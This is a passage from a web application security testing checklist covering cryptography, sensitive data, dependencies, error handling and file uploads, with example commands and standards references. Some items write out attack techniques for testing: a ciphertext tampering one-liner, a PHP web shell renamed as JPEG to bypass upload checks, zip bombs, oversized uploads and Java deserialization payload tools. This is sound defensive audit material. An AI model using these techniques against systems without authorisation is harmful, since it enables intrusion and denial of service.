  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.3.1; wstg: WSTG-CRYP-04; owasp_top10: A04:2025; cwe: CWE-327, CWE-780

- [ ] **WEB-CRYPTO-009** Make sure only approved ciphers and modes such as AES-GCM are used  
  *Severity if fail:* Medium | *Type:* Code Review | *Level:* ASVS L1  
  *Objective:* Find ciphers or modes that are not approved.  
  *Steps:*
  1. List every cipher and mode used for data at rest and in transit.
  2. Compare the list with the approved algorithm list of the organization or NIST.
  3. Check that data uses authenticated encryption, for example AES-GCM or ChaCha20-Poly1305.
  *Example:* `grep -rEn 'Cipher.getInstance|createCipheriv|AESGCM|ChaCha20' ./src`  
  *Expected:* Only approved ciphers and modes are used, with authenticated encryption by default.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.3.2; owasp_top10: A04:2025; cwe: CWE-327

- [ ] **WEB-CRYPTO-010** Make sure encrypted data is authenticated and encrypt-then-MAC is used  
  *Severity if fail:* High | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find encrypted data that an attacker can change without detection.  
  *Steps:*
  1. Find where encrypted data is stored or sent to the client.
  2. Change bytes of the cipher text and submit it.
  3. Check that the change is detected and rejected.
  4. If encryption and MAC are separate, check that the MAC is made over the cipher text.
  *Example:* `python3 -c 'import base64;d=bytearray(base64.b64decode("<token>"));d[20]^=1;print(base64.b64encode(d).decode())'`  
  *Expected:* Changed cipher text is rejected. Authenticated encryption or encrypt-then-MAC is used.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.3.3, V11.3.5; owasp_top10: A04:2025, A08:2025; cwe: CWE-353, CWE-345

- [ ] **WEB-CRYPTO-011** Make sure nonces and initialization vectors are unique for each key  
  *Severity if fail:* Medium | *Type:* Code Review, Manual | *Level:* ASVS L3  
  *Objective:* Find IV or nonce reuse and predictable IVs.  
  *Steps:*
  1. Find the code that creates an IV or nonce.
  2. Check that it uses a CSPRNG or a safe counter for the mode.
  3. Encrypt the same plain text twice and compare the output.
  4. Check that one IV is never used twice with one key.
  *Example:* `grep -rEn 'IvParameterSpec|iv\s*=|nonce\s*=' ./src; compare two encryptions of the same value`  
  *Expected:* Each encryption uses a new IV or nonce that fits the mode. Equal plain texts give different cipher texts.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.3.4; wstg: WSTG-CRYP-04; owasp_top10: A04:2025; cwe: CWE-323, CWE-329

- [ ] **WEB-CRYPTO-012** Make sure only approved hash functions are used  
  *Severity if fail:* Medium | *Type:* Code Review, Automated | *Level:* ASVS L1  
  *Objective:* Find MD5, SHA-1 and other banned hashes in security use, and hashes that are not collision resistant.  
  *Steps:*
  1. Search the code for MD5, SHA-1 and CRC used in security checks.
  2. Check signature, HMAC and KDF code for approved hashes.
  3. Check that digests used for signatures or integrity are at least 256 bits where collision resistance is needed.
  *Example:* `grep -rEn 'MessageDigest.getInstance|hashlib\.(md5|sha1)|createHash\(.(md5|sha1)' ./src; semgrep --config p/crypto`  
  *Expected:* Only approved hash functions, with enough output length, are used. MD5 is not used for any cryptographic purpose.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.4.1, V11.4.3; wstg: WSTG-CRYP-04; owasp_top10: A04:2025; cwe: CWE-328

- [ ] **WEB-CRYPTO-013** Check password hashing and key derivation settings  
  *Severity if fail:* High | *Type:* Code Review, Config Review | *Level:* ASVS L2  
  *Objective:* Find passwords that are stored with fast hashes or too few iterations, and weak password-based key derivation.  
  *Steps:*
  1. Find where passwords are hashed and where keys are made from passwords.
  2. Check for Argon2id, scrypt, bcrypt or PBKDF2 with current parameters.
  3. Check that each hash has a random salt.
  4. In a test copy, look at the hash format in the database.
  5. Check that passwords are not used directly as encryption keys.
  *Example:* `psql -c 'select password from users limit 3'  (hash prefix: $argon2id$, $2b$, $pbkdf2); hashcat --example-hashes`  
  *Expected:* Passwords use Argon2id, scrypt, bcrypt or PBKDF2 with current work factors and unique salts.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.4.2, V11.4.4; wstg: WSTG-CRYP-04; owasp_top10: A04:2025; cwe: CWE-916, CWE-759, CWE-261

- [ ] **WEB-CRYPTO-014** Make sure non-guessable values use a CSPRNG with 128 bits of entropy  
  *Severity if fail:* High | *Type:* Code Review, Manual | *Level:* ASVS L2  
  *Objective:* Find tokens, IDs and secrets that come from weak random number generators.  
  *Steps:*
  1. Find code that makes tokens, reset links, keys, nonces and session values.
  2. Search for Math.random, rand, java.util.Random and UUID v1 or v4 used as secrets.
  3. Collect 1000 tokens and look at length and patterns.
  4. Check that the generator works under load and is not reseeded with weak seeds.
  *Example:* `grep -rEn 'Math\.random|java\.util\.Random|rand\(|random\.random' ./src; Burp Sequencer on the token`  
  *Expected:* All security values come from a CSPRNG with at least 128 bits of entropy. Weak generators are not used.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.5.1, V11.5.2; owasp_top10: A04:2025; cwe: CWE-330, CWE-338, CWE-331

- [ ] **WEB-CRYPTO-015** Check key generation and signature algorithms  
  *Severity if fail:* Medium | *Type:* Code Review, Config Review | *Level:* ASVS L2  
  *Objective:* Find insecure key generation and algorithms for signatures.  
  *Steps:*
  1. Find where keys are made: RSA, EC and symmetric keys.
  2. Check that generation uses approved algorithms and a CSPRNG.
  3. Check RSA keys for known weak patterns.
  4. Check signature algorithms and key sizes in use.
  *Example:* `openssl rsa -in key.pem -text -noout | head -3; ssh-keygen -l -f key.pub`  
  *Expected:* Keys come from approved generation methods. Signatures use approved algorithms and sizes.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.6.1; owasp_top10: A04:2025; cwe: CWE-326, CWE-327

- [ ] **WEB-CRYPTO-016** Check key exchange algorithms and parameters  
  *Severity if fail:* Medium | *Type:* Automated, Config Review | *Level:* ASVS L3  
  *Objective:* Find weak Diffie-Hellman parameters and key exchange that enable adversary-in-the-middle attacks.  
  *Steps:*
  1. List key exchange methods in TLS and other protocols.
  2. Check that groups are approved: x25519, secp256r1 or ffdhe2048 or larger.
  3. Check for entity authentication in each key exchange.
  *Example:* `testssl.sh -f example.com; nmap --script ssl-dh-params -p443 example.com`  
  *Expected:* Key exchange uses approved algorithms with safe parameters and authenticates the peers.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.6.2; owasp_top10: A04:2025; cwe: CWE-322, CWE-326; capec: CAPEC-94

- [ ] **WEB-CRYPTO-017** Review memory protection and data minimization for sensitive data in use  
  *Severity if fail:* Info | *Type:* Manual, Code Review | *Level:* ASVS L3  
  *Objective:* Find sensitive data that stays in memory longer than needed and is not encrypted at once.  
  *Steps:*
  1. Read the design for memory encryption of sensitive data.
  2. Check how long keys and plain text stay in memory.
  3. Check that the application keeps the minimum data during processing.
  4. Check that data is encrypted as soon as possible.
  *Example:* `Design review; core dump and heap dump review for secrets: strings core.dump | grep -i 'BEGIN PRIVATE KEY'`  
  *Expected:* Sensitive data in use is limited and protected, and it is encrypted again as soon as possible.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.7.1, V11.7.2; owasp_top10: A04:2025

- [ ] **WEB-CRYPTO-018** Make sure no hard-coded, default or checked-in cryptographic keys exist  
  *Severity if fail:* High | *Type:* Automated, Code Review  
  *Objective:* Find keys in source code, repositories, images or configuration that an attacker can read.  
  *Steps:*
  1. Scan the repository and its history with trufflehog or gitleaks.
  2. Search for PEM headers, hex keys and JWT secrets in code, configs and images.
  3. Check for the default keys of frameworks and products.
  4. Check that each environment uses different keys.
  *Example:* `trufflehog git file://. --only-verified; gitleaks detect -v; grep -rEn 'BEGIN (RSA |EC )?PRIVATE KEY' .`  
  *Expected:* No cryptographic key is in source, history, images or default configuration. Each environment has its own keys.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; owasp_top10: A04:2025; cwe: CWE-321, CWE-798, CWE-547


## DATA

- [ ] **WEB-DATA-001** Review the classification of sensitive data and its protection requirements  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find sensitive data that is not classified and levels that have no documented protection rules.  
  *Steps:*
  1. Ask for the data classification and the list of protection levels.
  2. List the data the application creates and processes, including Base64 values and JWT payloads.
  3. Compare the list with the classification and find unclassified data.
  4. Check that each level has rules for encryption, integrity, retention, logging, access and privacy.
  *Example:* `Document review: data inventory vs classification table; decode JWT payloads and Base64 fields found in traffic.`  
  *Expected:* All sensitive data is classified and each level has documented protection rules.  
  *Refs:* asvs: V14.1.1, V14.1.2; owasp_top10: A04:2025; cheatsheet: Cryptographic_Storage_Cheat_Sheet

- [ ] **WEB-DATA-002** Make sure sensitive data is not sent in the URL  
  *Severity if fail:* Medium | *Type:* Manual, Automated | *Level:* ASVS L1  
  *Objective:* Find API keys, tokens and personal data in URLs, which logs, proxies and referrers store.  
  *Steps:*
  1. Walk through the application with a proxy and list all URLs with query strings.
  2. Look for tokens, keys, passwords, session IDs and personal data in URLs.
  3. Look at the Referer header sent to third parties.
  4. Look at server and proxy access logs for such URLs.
  *Example:* `zap-baseline.py -t https://example.com; grep -E '[?&](token|key|password|session)=' access.log`  
  *Expected:* Sensitive data goes only in the request body or header fields, never in the URL.  
  *Refs:* asvs: V14.2.1; cwe: CWE-598; owasp_top10: A04:2025

- [ ] **WEB-DATA-003** Make sure sensitive data is not kept in server-side caches  
  *Severity if fail:* Medium | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find load balancers, CDNs and application caches that store sensitive responses.  
  *Steps:*
  1. Request a sensitive page with a session, then request it with no session or another session.
  2. Look at the cache headers and the Age, X-Cache and CF-Cache-Status headers.
  3. Review CDN, reverse proxy and Redis or Memcached cache rules.
  4. Check that cached sensitive data is purged after use.
  *Example:* `curl -si -H 'Cookie: session=A' https://example.com/account; curl -si https://example.com/account | grep -iE 'age|x-cache|cache-status'`  
  *Expected:* Sensitive responses are not stored by shared caches, or the cache purges them after use.  
  *Refs:* asvs: V14.2.2; owasp_top10: A04:2025; cwe: CWE-524

- [ ] **WEB-DATA-004** Make sure sensitive data is not sent to untrusted third parties  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find trackers, analytics and third-party scripts that receive sensitive data.  
  *Steps:*
  1. Record the requests to third-party hosts in the developer tools.
  2. Look at the URL, headers and body of each request for personal or sensitive data.
  3. List third-party scripts and check how they are loaded and what they can read.
  4. Check consent rules for the data that is sent.
  *Example:* `Browser DevTools Network filter 'third-party'; mitmproxy -s log_third_party.py; Blacklight scan`  
  *Expected:* No sensitive data is sent to trackers or untrusted third parties. Only the listed data goes to approved parties.  
  *Refs:* asvs: V14.2.3; owasp_top10: A04:2025; cheatsheet: Third_Party_Javascript_Management_Cheat_Sheet; cwe: CWE-359

- [ ] **WEB-DATA-005** Check that data protection controls follow the documented protection level  
  *Severity if fail:* Medium | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find sensitive data whose real protection differs from its documented level.  
  *Steps:*
  1. Pick samples of each protection level.
  2. Check encryption, integrity checks, retention, logging and access control for each sample.
  3. Compare each result with the documented requirement.
  *Example:* `Sample review table: data item, level, required control, observed control, gap.`  
  *Expected:* Real controls match the documented requirements for each protection level.  
  *Refs:* asvs: V14.2.4; owasp_top10: A04:2025

- [ ] **WEB-DATA-006** Make sure caches store only expected content types and non-sensitive responses  
  *Severity if fail:* Medium | *Type:* Manual, Config Review | *Level:* ASVS L3  
  *Objective:* Find caches that store sensitive, dynamic or wrong-type responses, or serve another file for a missing one.  
  *Steps:*
  1. Request a non-existent static path and check for 404 or 302 and not another file.
  2. Request a dynamic page with a static extension, for example /account/x.css, and look at cache headers.
  3. Check that cache rules use the content type and not only the path.
  4. Request the page from a second client and compare.
  *Example:* `curl -si https://example.com/account/none.css -H 'Cookie: session=A'; curl -si https://example.com/account/none.css`  
  *Expected:* Caches store only the expected type of resource. Sensitive dynamic content is not cached. Missing files give 404 or 302.  
  *Refs:* asvs: V14.2.5; wstg: WSTG-CONF-13; owasp_top10: A04:2025; cwe: CWE-524

- [ ] **WEB-DATA-007** Make sure responses contain only the minimum sensitive data and mask values  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Find responses and pages with more sensitive data than the function needs.  
  *Steps:*
  1. Compare data shown in the UI with data in the response for key pages.
  2. Look for full card numbers, IDs, tokens and hashes in responses.
  3. Check that the UI masks values unless the user asks to see them.
  *Example:* `Burp: compare rendered page and JSON; jq 'paths' on the response to list all fields`  
  *Expected:* Responses return the minimum data. Sensitive values such as card numbers are partly masked.  
  *Refs:* asvs: V14.2.6, V15.3.1; wstg: WSTG-APIT-03; owasp_top10: A04:2025; cwe: CWE-200, CWE-213

- [ ] **WEB-DATA-008** Check retention and automatic deletion of sensitive data  
  *Severity if fail:* Low | *Type:* Manual, Config Review | *Level:* ASVS L3  
  *Objective:* Find sensitive data that stays after its retention period.  
  *Steps:*
  1. Ask for the retention schedule for each data class.
  2. Check that deletion jobs or database rules exist and run.
  3. Find records older than the schedule in a test or production copy.
  4. Delete a test record and check backups, caches and storage versions.
  *Example:* `SELECT count(*) FROM orders WHERE created < now() - interval '7 years';  review lifecycle rules of buckets`  
  *Expected:* Old sensitive data is deleted on schedule, with proof, including copies and versions.  
  *Refs:* asvs: V14.2.7; owasp_top10: A04:2025

- [ ] **WEB-DATA-009** Make sure metadata is removed from user-submitted files  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Find uploaded files that keep GPS, author and device data.  
  *Steps:*
  1. Upload an image that has EXIF GPS data and a document with author data.
  2. Download the stored file from another account or the public URL.
  3. Read the metadata with exiftool.
  4. Check that the user gave consent if metadata stays.
  *Example:* `exiftool -gps:all -author uploaded.jpg`  
  *Expected:* Stored files have no sensitive metadata unless the user agreed.  
  *Refs:* asvs: V14.2.8; wstg: WSTG-INFO-05; cwe: CWE-212

- [ ] **WEB-DATA-010** Make sure the client clears authenticated data when the session ends  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Find DOM, storage and cache data that stays in the browser after logout or timeout.  
  *Steps:*
  1. Log in, open sensitive pages, then log out.
  2. Look at localStorage, sessionStorage, IndexedDB, Cache API and the DOM.
  3. Use the Back button and look for sensitive pages.
  4. Check for the Clear-Site-Data header on the logout response.
  5. Test again with the server not reachable.
  *Example:* `curl -si -X POST https://example.com/logout -H 'Cookie: session=A' | grep -i clear-site-data; DevTools > Application > Storage`  
  *Expected:* No authenticated data stays in the client after the session ends. Clear-Site-Data or client code clears it.  
  *Refs:* asvs: V14.3.1; wstg: WSTG-CONF-14; owasp_top10: A04:2025; cwe: CWE-922

- [ ] **WEB-DATA-011** Check anti-caching headers on sensitive responses  
  *Severity if fail:* Medium | *Type:* Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find sensitive pages that browsers may cache.  
  *Steps:*
  1. Request pages with sensitive data after login and read Cache-Control, Pragma and Expires.
  2. Make sure Cache-Control: no-store is set. no-cache alone is not enough.
  3. Log out, then use the Back button and look for the cached page.
  4. Check API responses and file downloads too.
  *Example:* `curl -sI https://example.com/account -H 'Cookie: session=A' | grep -iE 'cache-control|pragma|expires'`  
  *Expected:* All sensitive responses send Cache-Control: no-store. The browser shows no cached page after logout.  
  *Refs:* asvs: V14.3.2; owasp_top10: A04:2025; cheatsheet: HTTP_Headers_Cheat_Sheet; cwe: CWE-525

- [ ] **WEB-DATA-012** Make sure browser storage holds no sensitive data except session tokens  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find sensitive data in localStorage, sessionStorage, IndexedDB and cookies.  
  *Steps:*
  1. Use the application for the main functions.
  2. Read all keys and values in localStorage, sessionStorage, IndexedDB and cookies.
  3. Look for personal data, API keys, JWTs with personal data and passwords.
  4. Check that cookies with tokens are the only secrets.
  *Example:* `DevTools > Application; chrome-devtools evaluate: JSON.stringify(localStorage)`  
  *Expected:* Browser storage holds no sensitive data. Only session tokens are allowed, in protected cookies.  
  *Refs:* asvs: V14.3.3; owasp_top10: A04:2025; cwe: CWE-922

- [ ] **WEB-DATA-013** Make sure sensitive data is encrypted at rest  
  *Severity if fail:* High | *Type:* Config Review, Manual  
  *Objective:* Find stored sensitive data in clear text, such as databases, files and backups.  
  *Steps:*
  1. Find where sensitive data is stored: database, files, object storage, backups, logs.
  2. Check encryption at rest at the storage and the application level.
  3. Check that keys are stored apart from the data.
  4. Check that data not needed is not stored.
  *Example:* `aws rds describe-db-instances --query 'DBInstances[].StorageEncrypted'; aws s3api get-bucket-encryption --bucket BUCKET`  
  *Expected:* All sensitive data at rest is encrypted with managed keys that are separate from the data.  
  *Refs:* owasp_top10: A04:2025; cheatsheet: Cryptographic_Storage_Cheat_Sheet; cwe: CWE-311, CWE-312


## DEP

- [ ] **WEB-DEP-001** Review remediation time frames for vulnerable third-party components  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Find missing or weak rules for how fast vulnerable libraries and components must be updated.  
  *Steps:*
  1. Ask for the documented remediation time frames by risk level.
  2. Check that the rules cover libraries, frameworks, runtimes, the OS and containers.
  3. Check that a process tracks advisories for the components in use, for example CVE, OSV and vendor feeds.
  4. Look at the last three vulnerability fixes and compare the real time with the rule.
  *Example:* `Document review; osv-scanner -r . ; dependency-check --scan . --format JSON`  
  *Expected:* Documented time frames exist, cover all component types, and past fixes met them.  
  *Refs:* asvs: V15.1.1; owasp_top10: A03:2025; cheatsheet: Vulnerable_Dependency_Management_Cheat_Sheet; cwe: CWE-1395, CWE-1104

- [ ] **WEB-DEP-002** Check the component inventory (SBOM) and the trust of package sources  
  *Severity if fail:* Medium | *Type:* Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find unknown components, transitive dependencies and untrusted package repositories.  
  *Steps:*
  1. Generate or request an SBOM for each release, with direct and transitive dependencies.
  2. Compare the SBOM with the lock files and the deployed artifact.
  3. Check that all components come from defined, trusted and maintained repositories.
  4. Check that client-side libraries are in the inventory.
  *Example:* `syft dir:. -o cyclonedx-json > sbom.json; cdxgen -o bom.json .; grype sbom:sbom.json`  
  *Expected:* A current SBOM covers all components and their sources. Every component comes from a trusted repository.  
  *Refs:* asvs: V15.1.2; owasp_top10: A03:2025; cheatsheet: Dependency_Graph_SBOM_Cheat_Sheet, Software_Supply_Chain_Security_Cheat_Sheet; cwe: CWE-1357, CWE-1104

- [ ] **WEB-DEP-003** Find components with known vulnerabilities, outdated or unsupported versions  
  *Severity if fail:* High | *Type:* Automated, Manual | *Level:* ASVS L1  
  *Objective:* Find components that break the update time frames or that have known CVEs.  
  *Steps:*
  1. Identify component versions from banners, JavaScript comments, file names and package files.
  2. Scan server-side dependencies with a software composition analysis tool.
  3. Scan client-side libraries with retire.js.
  4. Check support status and end-of-life dates for the OS, runtime, server and database.
  5. Check each finding by hand against the real version.
  *Example:* `retire --js --outputformat json; trivy fs --scanners vuln .; osv-scanner -r .; nuclei -u https://example.com -tags cve,tech`  
  *Expected:* No component is vulnerable, unsupported or past the documented update time frame.  
  *Refs:* asvs: V15.2.1; wstg: WSTG-INFO-08, WSTG-CONF-01; owasp_top10: A03:2025; cheatsheet: Vulnerable_Dependency_Management_Cheat_Sheet; cwe: CWE-1395, CWE-1104, CWE-447

- [ ] **WEB-DEP-004** Make sure dependencies come from the expected repository (dependency confusion)  
  *Severity if fail:* High | *Type:* Manual, Config Review | *Level:* ASVS L3  
  *Objective:* Find internal package names that a public repository can supply, and unpinned dependency sources.  
  *Steps:*
  1. List the internal package names and the repository settings in npm, pip, Maven and NuGet.
  2. Check that the public registry has no package with an internal name.
  3. Check that scoped registries or index settings force the internal repository.
  4. Check that lock files pin versions and hashes.
  *Example:* `npm config get registry; pip config list; cat .npmrc pip.conf; npm view @company/internal-lib`  
  *Expected:* All dependencies, including transitive ones, resolve from the expected repository. Lock files pin them.  
  *Refs:* asvs: V15.2.4; owasp_top10: A03:2025, A08:2025; cheatsheet: Software_Supply_Chain_Security_Cheat_Sheet; cwe: CWE-427, CWE-829; capec: CAPEC-695

- [ ] **WEB-DEP-005** Check integrity of downloaded code, packages and third-party scripts  
  *Severity if fail:* High | *Type:* Manual, Automated  
  *Objective:* Find code that the application loads or installs without a signature or integrity check.  
  *Steps:*
  1. List external scripts and styles in the pages.
  2. Check for Subresource Integrity attributes with the crossorigin setting.
  3. Check that package installs use signatures or hashes, and the lock file is used.
  4. Check that auto-update and plugin download features check signatures.
  5. Check mappings of company sub-domains to external providers.
  *Example:* `curl -s https://example.com | grep -oE '<script[^>]+src=[^>]+>' | grep -v integrity; npm ci --ignore-scripts; pip install --require-hashes -r requirements.txt`  
  *Expected:* External code is loaded only with integrity checks or signatures, and from trusted sources.  
  *Refs:* owasp_top10: A08:2025; cheatsheet: Third_Party_Javascript_Management_Cheat_Sheet, Software_Supply_Chain_Security_Cheat_Sheet; cwe: CWE-494, CWE-829, CWE-830, CWE-345; capec: CAPEC-185, CAPEC-186

- [ ] **WEB-DEP-006** Make sure serialized data from clients is signed or integrity-checked  
  *Severity if fail:* High | *Type:* Manual, Code Review  
  *Objective:* Find serialized objects, cookies and state that the client can change and the server trusts.  
  *Steps:*
  1. Find serialized objects, view-state values and state cookies in requests.
  2. Change a value and send the request again.
  3. Replay an old value after a state change.
  4. Check that a signature or MAC protects the data, and that the server does not deserialize untrusted data.
  *Example:* `Burp Repeater: edit the serialized value; ysoserial or marshalsec for Java test payloads in a lab`  
  *Expected:* The server rejects changed or replayed serialized data. It does not deserialize unsigned client data.  
  *Refs:* owasp_top10: A08:2025; cwe: CWE-502, CWE-565, CWE-784, CWE-345

- [ ] **WEB-DEP-007** Review documented risky components and dangerous functionality and their protections  
  *Severity if fail:* Medium | *Type:* Manual, Code Review | *Level:* ASVS L3  
  *Objective:* Find risky libraries and dangerous functions with no documentation and no isolation.  
  *Steps:*
  1. Ask for the list of risky third-party components and dangerous functionality.
  2. Find use of eval, system commands, deserialization, XML parsers and file conversion.
  3. Check that each item has sandboxing, containerization or network-level isolation.
  4. Compare the list with a code scan result.
  *Example:* `semgrep --config p/default ./src; grep -rEn 'eval\(|exec\(|Runtime.getRuntime|pickle.loads' ./src`  
  *Expected:* Risky components and dangerous functionality are documented and have extra protection.  
  *Refs:* asvs: V15.1.4, V15.1.5, V15.2.5; owasp_top10: A03:2025; cwe: CWE-749


## ERR

- [ ] **WEB-ERR-001** Make sure errors return a generic message without stack traces or internals  
  *Severity if fail:* Medium | *Type:* Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find error output that shows stack traces, queries, paths, versions, keys or tokens.  
  *Steps:*
  1. Send wrong types, missing parameters, long values and special characters to every input.
  2. Send malformed JSON and XML bodies and invalid HTTP requests.
  3. Request missing files and folders.
  4. Look at the response body and headers for stack traces, SQL, paths, versions and secrets.
  5. Look at error responses that return status 200.
  6. Check that debug pages and consoles are off.
  *Example:* `ffuf -u 'https://example.com/page?id=FUZZ' -w fuzz-errors.txt -mc 500; curl -si 'https://example.com/api/item/%00'; zap-baseline.py -t https://example.com`  
  *Expected:* Unexpected or security-sensitive errors return a generic message and a correlation ID. No internal data is visible.  
  *Refs:* wstg: WSTG-ERRH-01, WSTG-ERRH-02; asvs: V16.5.1; owasp_top10: A10:2025, A02:2025; cheatsheet: Error_Handling_Cheat_Sheet; cwe: CWE-209, CWE-550, CWE-215; capec: CAPEC-54

- [ ] **WEB-ERR-002** Make sure web server and framework use custom error pages  
  *Severity if fail:* Low | *Type:* Manual, Config Review  
  *Objective:* Find default server and framework error pages that identify the product and version.  
  *Steps:*
  1. Request random missing paths and forbidden folders.
  2. Send a request that breaks the HTTP rules, such as a wrong version or a very long line.
  3. Compare the pages with the known default pages of Apache, Nginx, IIS and the framework.
  4. Look at the configuration for custom error pages and a global error handler.
  *Example:* `curl -si https://example.com/nonexistent-$(date +%s); printf 'GET / HTTP/9.9\r\n\r\n' | openssl s_client -quiet -connect example.com:443`  
  *Expected:* The application uses custom error pages and a central error handler. No default product page is shown.  
  *Refs:* wstg: WSTG-ERRH-01, WSTG-INFO-02; owasp_top10: A02:2025; cheatsheet: Error_Handling_Cheat_Sheet; cwe: CWE-756, CWE-209

- [ ] **WEB-ERR-003** Make sure the application degrades safely when an external resource fails  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find applications that crash, hang or expose data when a dependency is down.  
  *Steps:*
  1. Block, slow down or break one dependency at a time in a test system.
  2. Look at the user response and the application state.
  3. Check for circuit breakers, time-outs and graceful degradation.
  4. Check that the application recovers when the dependency returns.
  *Example:* `toxiproxy-cli toxic add -t timeout -a timeout=0 backend; iptables -A OUTPUT -d <dep-ip> -j DROP`  
  *Expected:* The application keeps working in a safe reduced mode, gives a generic error, and recovers by itself.  
  *Refs:* asvs: V16.5.2; owasp_top10: A10:2025; cwe: CWE-755, CWE-400

- [ ] **WEB-ERR-004** Make sure the application fails closed and rolls back on errors  
  *Severity if fail:* High | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find fail-open paths where an error lets a request or transaction pass.  
  *Steps:*
  1. Make a validation, authorization or payment step fail with an exception in a test system.
  2. Check that the request is denied and not processed.
  3. Interrupt a multi-step transaction in the middle and check the state of the data.
  4. Check that partial changes are rolled back.
  *Example:* `Burp Repeater: send input that raises an exception in the validator; interrupt the second step of a transfer with a dropped connection`  
  *Expected:* Errors lead to denial and complete rollback. No transaction is processed after a failed check.  
  *Refs:* asvs: V16.5.3; owasp_top10: A10:2025, A09:2025; cwe: CWE-636, CWE-755, CWE-460

- [ ] **WEB-ERR-005** Check for a last-resort error handler that catches all exceptions  
  *Severity if fail:* Medium | *Type:* Code Review, Manual | *Level:* ASVS L3  
  *Objective:* Find code paths with no global handler that lose error data or stop the process.  
  *Steps:*
  1. Find the global exception handler in the framework configuration.
  2. Raise an unhandled exception in a test route and in a background job.
  3. Check that the process stays up, the error is logged, and the user gets a generic message.
  4. Search the code for empty catch blocks and generic exceptions.
  *Example:* `grep -rEn 'catch\s*\(\s*(Exception|Throwable)|except\s*:|catch\s*\{\s*\}' ./src`  
  *Expected:* A central handler catches all unhandled exceptions, logs them and keeps the process available.  
  *Refs:* asvs: V16.5.4; owasp_top10: A10:2025; cheatsheet: Error_Handling_Cheat_Sheet; cwe: CWE-248, CWE-396, CWE-390


## FILE

- [ ] **WEB-FILE-001** Review documentation for permitted upload types, extensions and size  
  *Severity if fail:* Info | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Confirms upload features document the allowed file types, extensions, maximum size and safety handling.  
  *Steps:*
  1. Request the application design documentation for each upload feature.
  2. Check that permitted file types, extensions and maximum unpacked size are documented.
  3. Check that the documentation states how a detected malicious file is handled.
  *Example:* `Review upload feature specification for the stated allowlist, size limit and malicious-file handling`  
  *Expected:* Every upload feature documents its permitted types, extensions, size limit and how malicious files are handled.  
  *Refs:* asvs: V5.1.1; cheatsheet: File_Upload_Cheat_Sheet

- [ ] **WEB-FILE-002** Test file upload size limits for denial of service  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds upload endpoints that accept files larger than the application can safely process.  
  *Steps:*
  1. Identify an upload endpoint and its stated size limit.
  2. Upload a file just under, at, and over the stated limit.
  3. Upload a very large file and monitor server resource use and response time.
  *Example:* `curl -F "file=@bigfile_1gb.bin" https://target/upload and monitor CPU, memory and response time`  
  *Expected:* The server enforces the documented size limit before processing and rejects oversized files without resource exhaustion.  
  *Refs:* asvs: V5.2.1; cheatsheet: Denial_of_Service_Cheat_Sheet; cwe: CWE-400; capec: CAPEC-130

- [ ] **WEB-FILE-003** Test file type validation against extension, Content-Type and magic bytes  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds uploads validated only by extension or Content-Type instead of actual file content.  
  *Steps:*
  1. Identify how the upload feature checks file type: client-side script, Content-Type header, or extension.
  2. Upload a file with a disallowed extension renamed to an allowed one, keeping its original magic bytes.
  3. Upload a file with an allowed extension but a Content-Type header for a disallowed type.
  4. Upload a polyglot or mismatched-signature file to see if magic byte checks are enforced.
  *Example:* `Rename shell.php to shell.jpg while keeping PHP content, and set Content-Type: image/jpeg on a PHP file`  
  *Expected:* The server validates the true file content, including magic bytes, against the expected type for every upload, not only the extension or header.  
  *Refs:* wstg: WSTG-BUSL-08; asvs: V5.2.2; cheatsheet: File_Upload_Cheat_Sheet; cwe: CWE-434, CWE-646; capec: CAPEC-650

- [ ] **WEB-FILE-004** Test compressed file uploads for decompression bomb limits  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds archive extraction that does not cap uncompressed size or file count before extracting.  
  *Steps:*
  1. Identify an upload or import feature that accepts a compressed file such as zip, gz, docx or odt.
  2. Create an archive with an extreme compression ratio, for example a zip bomb.
  3. Create an archive containing an extremely large number of files.
  4. Upload each archive and monitor storage and resource use during extraction.
  *Example:* `Create a 42.zip-style nested zip bomb or a zip with 100000 tiny files, then upload and monitor disk and CPU use`  
  *Expected:* The application checks the uncompressed size and file count against a maximum before extracting any archive.  
